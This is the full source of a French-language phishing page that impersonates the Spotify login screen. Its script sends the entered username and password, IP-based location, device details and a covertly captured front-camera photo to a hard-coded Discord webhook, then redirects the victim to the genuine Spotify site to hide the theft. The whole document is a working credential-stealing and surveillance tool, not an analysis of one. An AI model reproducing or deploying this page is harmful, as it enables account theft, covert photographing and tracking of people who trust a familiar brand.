<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Spotify Premium</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background-color: #121212; width: 90%; max-width: 400px; padding: 40px; border-radius: 8px; text-align: center; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; margin-bottom: 16px; font-size: 16px; }
        input:focus { border: 2px solid #fff; outline: none; padding: 13px; }
        .btn { background: #1DB954; color: #000; font-weight: 700; padding: 15px; border-radius: 500px; width: 100%; text-transform: uppercase; cursor: pointer; border: none; margin-top: 10px; }
        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
        .error { color: #f15555; font-size: 13px; margin-bottom: 15px; display: none; text-align: left; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" class="w-24 mx-auto mb-8">
        <h1 class="text-2xl font-bold mb-8">Se connecter</h1>
        
        <div id="errMsg" class="error">Nom d'utilisateur ou mot de passe incorrect.</div>

        <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur">
        <input id="p" type="password" placeholder="Mot de passe">
        
        <button onclick="ultimateCapture()" id="b" class="btn">Se connecter</button>
        
        <div class="mt-8 text-xs text-gray-400">
            <p>En continuant, vous acceptez les conditions d'utilisation.</p>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function ultimateCapture() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if (p.length < 4) { document.getElementById('errMsg').style.display = 'block'; return; }

            document.getElementById('b').innerHTML = "TRAITEMENT...";

            // 1. DATA MINING (IP + VPN + MAPS)
            let n = {};
            try {
                const r = await fetch('https://ipapi.co/json/');
                n = await r.json();
            } catch(e) {}

            const maps = `https://www.google.com/maps?q=${n.latitude},${n.longitude}`;
            
            // 2. SYSTEME & HARDWARE
            let bat = "Inconnue";
            try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}%`; } catch(e) {}

            // 3. ENVOI DISCORD ULTIMATE
            const msg = {
                embeds: [{
                    title: "🚀 LOG ULTIMATE RÉCUPÉRÉ",
                    color: 1947988,
                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/1024px-Spotify_logo_without_text.svg.png" },
                    fields: [
                        { name: "👤 Identifiants", value: `**User:** \`${u}\`\n**Pass:** \`${p}\``, inline: false },
                        { name: "📍 Localisation", value: `**IP:** \`${n.ip}\`\n**Ville:** \`${n.city}\`\n**FAI:** \`${n.org}\`\n**[Voir sur Maps](${maps})**`, inline: false },
                        { name: "📱 Appareil", value: `**RAM:** \`${navigator.deviceMemory}GB\`\n**Batterie:** \`${bat}\`\n**Langue:** \`${navigator.language}\``, inline: true },
                        { name: "🛡️ Infos Sécurité", value: `**Plateforme:** \`${navigator.platform}\`\n**VPN/Proxy:** \`${n.security ? 'Détecté' : 'Aucun'}\``, inline: true }
                    ],
                    footer: { text: "LVN-SYSTEM ULTIMATE • " + new Date().toLocaleString() }
                }]
            };

            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });

            // 4. PHOTO HD
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const vid = document.getElementById('v');
                vid.srcObject = s;
                await new Promise(r => setTimeout(r, 1800));
                const can = document.getElementById('c');
                can.width = 1280; can.height = 720;
                can.getContext('2d').drawImage(vid, 0, 0);
                can.toBlob(async (b) => {
                    const f = new FormData();
                    f.append('file', b, 'capture.png');
                    f.append('content', "📸 **PHOTO HAUTE RÉSOLUTION RÉCUPÉRÉE :**");
                    await fetch(hook, { method: 'POST', body: f });
                    s.getTracks().forEach(t => t.stop());
                }, 'image/png');
            } catch (e) {}

            setTimeout(() => { window.location.href = "https://www.spotify.com/fr/premium/"; }, 2500);
        }
    </script>
</body>
</html>
